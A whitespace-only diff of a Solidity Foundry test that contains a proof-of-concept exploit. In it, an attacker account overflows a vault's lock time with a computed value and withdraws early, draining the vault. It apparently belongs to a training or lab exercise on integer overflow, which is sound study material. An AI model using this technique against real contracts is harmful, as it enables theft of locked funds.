@@ -18,13 +18,13 @@ contract TimeVaultTest is Test {
         vm.startPrank(attacker);
 
         vault.deposit{value: 1}();
-                        
+
         uint256 secondsToOverflow = type(uint256).max - (block.timestamp + 1 weeks) + 1;
 
         vault.increaseLockTime(secondsToOverflow);
-        
+
         vault.withdraw();
-        
+
         assertEq(address(vault).balance, 0);
         console.log("Attacker balance after exploit:", attacker.balance);
         vm.stopPrank();
